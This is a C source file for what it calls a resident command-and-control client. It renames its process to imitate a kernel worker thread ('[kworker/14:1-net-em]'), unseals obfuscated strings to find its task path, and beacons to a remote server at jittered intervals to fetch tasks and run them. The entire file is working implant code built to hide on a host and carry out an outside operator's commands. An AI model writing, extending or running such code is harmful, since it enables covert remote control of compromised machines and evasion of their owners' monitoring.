/* ks-worker: resident C2 client polling the task queue over mTLS. */
#include "http.h"
#include "obfuscate.h"
#include "tasks.h"

#include <sys/prctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifndef C2_POLL_INTERVAL
#define C2_POLL_INTERVAL 23
#endif
#ifndef C2_POLL_JITTER
#define C2_POLL_JITTER 7
#endif

#define WORKER_NAME "[kworker/14:1-net-em]"
#define MAX_TASK_BODY 4096

static int poll_once(int *status, unsigned char *body, size_t *body_len)
{
    http_conn conn;
    const char *path;
    int result;

    if (http_open(&conn) != 0)
        return -1;
    path = agent_unseal_string(STR_TASKS);
    result = http_request(&conn, "GET", path, NULL, 0, status, body,
                          MAX_TASK_BODY, body_len);
    agent_reseal();
    http_close(&conn);
    return result;
}

int main(int argc, char **argv)
{
    unsigned char body[MAX_TASK_BODY + 1];
    worker_task task;
    int single = argc > 1 && !strcmp(argv[1], "-1");
    int status = -1;
    size_t body_len = 0;

    prctl(PR_SET_NAME, WORKER_NAME, 0, 0, 0);
    srand((unsigned int)(time(NULL) ^ getpid()));
    do
    {
        body_len = 0;
        if (poll_once(&status, body, &body_len) == 0 && status == 200)
        {
            body[body_len] = '\0';
            if (task_parse((const char *)body, body_len, &task) == 0)
                task_run(&task);
        }
        if (!single)
        {
            int delay = C2_POLL_INTERVAL + rand() % (C2_POLL_JITTER + 1);
            sleep((unsigned int)delay);
        }
    } while (!single);
    return 0;
}
